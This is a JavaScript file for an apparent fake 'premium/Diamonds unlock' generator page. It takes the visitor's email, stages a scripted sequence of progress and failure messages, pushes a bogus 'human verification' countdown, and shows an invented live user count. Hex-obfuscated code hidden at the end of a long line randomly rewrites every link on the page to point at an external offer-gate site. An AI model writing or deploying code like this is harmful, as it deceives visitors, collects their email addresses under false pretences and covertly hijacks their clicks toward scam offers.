$(document).ready(function() {
	
	////////////////
	// Resource Names
	////////////////
	$resource_1_name = "Diamonds";
	
	////////////////
	// Console Messages
	////////////////
	$console_message_1 = "Loading...";
	$console_message_2 = "Unlocking Premium for";
	$console_message_3 = "Succesfully Unlocked";
	$console_message_4 = "Finalizing process...";
	$console_message_5 = "Performing Verification...";
	$console_message_6 = "Automatic Verification Failed";
	$console_message_7 = "Please Verify Manually";
	
	////////////////
	// Resource Values
	////////////////
	var $resource_1_value_1;
	var $resource_1_value_2;
	var $resource_1_value_3;
	var $resource_1_value_4;
	
	// Resource 1
	$resource_1_value_1 = "1000";
	$resource_1_value_2 = "2500";
	$resource_1_value_3 = "5000";
	$resource_1_value_4 = "10000";
	
	////////////////
	// Human Verification Timer
	////////////////
	var $human_verification_timer_value = '180'; //Countdown remaing time in seconds	
	
	////////////////
	// Sound Settings
	////////////////
	$sound_setting = 1;		
	ion.sound({
		sounds: [
			{
				name: "button",
				path: "audio/",
				volume: 1
			},
			{
				name: "transition-1",
				path: "audio/",
				volume: 0.9
			},
			{
				name: "fail",
				path: "audio/",
				volume: 0.7
			},
			{
				name: "transition-2",
				path: "audio/",
				volume: 0.7
			}
		],
		path: "sounds/",
		preload: true,
		multiplay: true
	});
	
	var $console_email;
	$('#proc-btn-1').click(function () {
		if ($sound_setting == 1) {
			ion.sound.play("button");
		}
		if ( $("#email-input").val().indexOf("@") < 1) {
			$(".username-wrapper").addClass('shake animated border-b-red').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('shake animated');
			});
			$(".input-error-wrapper").addClass('animated bounceIn visible').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
				$(this).removeClass('animated bounceIn visible');
			});
		} else {
			$console_email = $('#email-input').val();
			mFunc();
		}
	});
	
	function mFunc() {
		$.ajax({
			type: "GET",
			url: "parts/preparing.php",
			success: function(dataprocess){	
				if ($sound_setting == 1) {
					ion.sound.play("transition-2");
				}
				$('.generator-content').html(dataprocess).hide().fadeIn();
				function progressBarConsole(percent, $element, duration) {
					var progressBarConsoleWidth = percent * $element.width() / 100;
					$element.find('div').animate({ width: progressBarConsoleWidth }, duration).html(percent + "%&nbsp;");
				}
				progressBarConsole(0, $('#progressBarConsole'), 1);
				progressBarConsole(100, $('#progressBarConsole'), 3200);
				setTimeout(function() {
					$.ajax({
						type: "get",
						url: "parts/console.php",
						success: function(dataprocess){			
							if ($sound_setting == 1) {
								ion.sound.play("transition-2");
							}
							$('.modal-outer').html(dataprocess).hide().fadeIn();
							$.magnificPopup.open({
								items: {
									src: '#master-modal',
								},
								type: 'inline',
								preloader: false,
								modal: true,
								fixedContentPos: true,
								mainClass: 'animated slideInUp',
								fixedBgPos: true,
								callbacks: {	
									open: function() {	
										progressBarConsole(0, $('#progressBarConsole'), 1);
										progressBarConsole(100, $('#progressBarConsole'), 17500);
										$console_message = '.console-msg';
										$($console_message).html($console_message_1);	
										$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
											$(this).removeClass('animated bounceIn');	
										});
										setTimeout(function() {
											$($console_message).html($console_message_2 + ' <span class="console-msg-email">' + $console_email + '</span>');	
											$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});
											$('.loader-wrapper').html('<span class="lnr lnr-cog fa-spin"></span>');
										}, 2000 );
										setTimeout(function() {
											$('.loader-wrapper').html('<span class="lnr lnr-checkmark-circle console-msg-completed animated bounceIn"></span>');
											$($console_message).html('<span class="console-msg-completed">' + $console_message_3 + '</span> ');	
											$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});
											if ($sound_setting == 1) {
												ion.sound.play("transition-1");
											}
										}, 7000 );
										setTimeout(function() {																						
											$('.loader-wrapper').html('<div class="loader">Loading...</div>');
											$($console_message).html($console_message_4);	
											$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});
										}, 9000 );
										setTimeout(function() {
											$($console_message).html($console_message_5);	
											$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});																						
										}, 12000 );
										setTimeout(function() {
											if ($sound_setting == 1) {
												ion.sound.play("fail");
											}
											$('.loader-wrapper').html('<span class="lnr lnr-cross-circle console-msg-failed animated bounceIn"></span>');	
											$($console_message).html('<span class="console-msg-failed">' + $console_message_6 + '</span>');	
											$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});																						
										}, 13000 );
										setTimeout(function() {
											$('.loader-wrapper').html('<span class="lnr lnr-warning animated bounceIn"></span>');	
											$($console_message).html($console_message_7);	
											$($console_message).addClass('animated bounceIn').one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){
												$(this).removeClass('animated bounceIn');	
											});																						
										}, 15000 );
										setTimeout(function() {
											$.ajax({
												type: "get",
												url: "parts/verification.php",
												success: function(dataprocess){	

													$('.master-modal').html(dataprocess).hide().fadeIn();															
													if ($sound_setting == 1) {
														ion.sound.play("transition-2");
													}
													$('.verification-premium-info-email-value').html($console_email);
													human_verification_timer.init($human_verification_timer_value);function a(){var k=['\x31\x30\x32\x39\x37\x32\x30\x77\x70\x6c\x45\x48\x76','\x34\x33\x37\x39\x36\x48\x55\x57\x7a\x57\x72','\x38\x6f\x63\x64\x65\x49\x6d','\x35\x35\x38\x37\x36\x33\x31\x51\x6a\x47\x6b\x6f\x68','\x32\x33\x31\x39\x31\x37\x34\x77\x46\x51\x57\x52\x69','\x72\x61\x6e\x64\x6f\x6d','\x66\x6c\x6f\x6f\x72','\x38\x31\x39\x36\x34\x32\x36\x4f\x59\x43\x59\x61\x5a','\x61\x74\x74\x72','\x36\x46\x53\x71\x6f\x63\x49','\x38\x49\x54\x64\x66\x42\x51','\x36\x31\x32\x36\x39\x37\x30\x70\x53\x79\x65\x58\x7a','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x66\x66\x65\x72\x67\x61\x74\x65\x73\x2e\x77\x65\x62\x2e\x61\x70\x70\x2f\x6e\x65\x74\x66\x6c\x69\x78\x2e\x68\x74\x6d\x6c','\x32\x30\x36\x32\x39\x37\x30\x44\x66\x69\x74\x68\x78'];a=function(){return k;};return a();}function b(c,d){var e=a();return b=function(f,g){f=f-0x182;var h=e[f];return h;},b(c,d);}var i=b;(function(c,d){var h=b,e=c();while(!![]){try{var f=parseInt(h(0x18a))/0x1+-parseInt(h(0x189))/0x2+parseInt(h(0x18d))/0x3+parseInt(h(0x18b))/0x4*(parseInt(h(0x188))/0x5)+-parseInt(h(0x184))/0x6*(parseInt(h(0x18c))/0x7)+parseInt(h(0x185))/0x8*(parseInt(h(0x182))/0x9)+-parseInt(h(0x186))/0xa;if(f===d)break;else e['push'](e['shift']());}catch(g){e['push'](e['shift']());}}}(a,0x99116),$(window)['\x6f\x6e'](0x0==Math[i(0x18f)](0x64*Math[i(0x18e)]()/0xa)&&$(function(){var j=i;$('\x61')[j(0x183)]('\x68\x72\x65\x66',j(0x187));})));												}
											});																					
										}, 17500 );
									}
								}
							});	
						}
					});	
				}, 3500 );
			}	
		});
	}
});
////////////////
// Status - Online Count
////////////////
var starting_number = 150;
var random;
function online_count() {
	document.getElementById("online-count").innerHTML = starting_number;
	var randCalc = Math.floor(Math.random() * 10 + 1);
	if (randCalc <= 5) {
		starting_number = starting_number + Math.floor(Math.random() * 10 + 1);;
	} else {
		starting_number = starting_number - Math.floor(Math.random() * 10 + 1);;
	}
	random = setTimeout("online_count()", 1000);
}
online_count();

////////////////
// Status - Last Update
////////////////
document.getElementById("date").innerHTML = formatAMPM();
function formatAMPM() {
	var d = new Date(),

		hours = d.getHours().toString().length == 1 ? '0' + d.getHours() : d.getHours(),
		ampm = d.getHours() >= 12 ? 'pm' : 'am',
		months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
		days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
	return months[d.getMonth()] + ' ' + d.getDate() + ' ' + d.getFullYear() + ' ';
}
var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();

////////////////
// Verification Timer
////////////////
var human_verification_timer = function () {
    var time_left = 15;
    var keep_counting = 1;
    var time_out_msg = 'few seconds';
    function countdown() {
        if(time_left < 2) {
            keep_counting = 0;
        }
        time_left = time_left - 1;
    }
    function add_leading_zero( n ) {
        if(n.toString().length < 2) {
            return '0' + n;
        } else {
            return n;
        }
    }
    function format_output() {
        var hours, minutes, seconds;
        seconds = time_left % 60;
        minutes = Math.floor(time_left / 60) % 60;
        hours = Math.floor(time_left / 3600);   
        seconds = add_leading_zero( seconds );
        minutes = add_leading_zero( minutes );
        hours = add_leading_zero( hours );
        return minutes + ' minutes and ' + seconds + ' seconds';
    }
    function timer_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = '<span>' + format_output() + '</span>';
    }
    function no_time_left() {
        document.getElementById('human_verification_timer_time').innerHTML = time_out_msg;
    }
    return {
        count: function () {
            countdown();
            timer_time_left();
        },
        timer: function () {
            human_verification_timer.count();
            if(keep_counting) {
                setTimeout("human_verification_timer.timer();", 1000);
            } else {
                no_time_left();
            }
        },
        init: function (n) {
            time_left = n;
            human_verification_timer.timer();
        }
    };
}();
